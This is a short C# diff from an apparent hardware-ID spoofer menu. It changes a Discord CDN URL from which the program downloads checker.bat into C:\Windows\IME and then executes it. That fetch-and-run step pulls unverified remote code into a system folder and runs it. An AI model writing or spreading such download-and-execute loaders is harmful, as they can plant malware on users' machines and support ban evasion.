@@ -212,7 +212,7 @@ namespace Spoofer_menu_test
             {
                 Console.Clear();
                 string checker = @"C:\Windows\IME\checker.bat";
-                web.DownloadFile("https://cdn.discordapp.com/attachments/1046596934493814884/1065665748783083600/checker.bat", checker);
+                web.DownloadFile("https://cdn.discordapp.com/attachments/1046596934493814884/1065673904317812736/checker.bat", checker);
                 process.StartInfo.UseShellExecute = false;
                 process = Process.Start(checker);
                 process.WaitForExit();
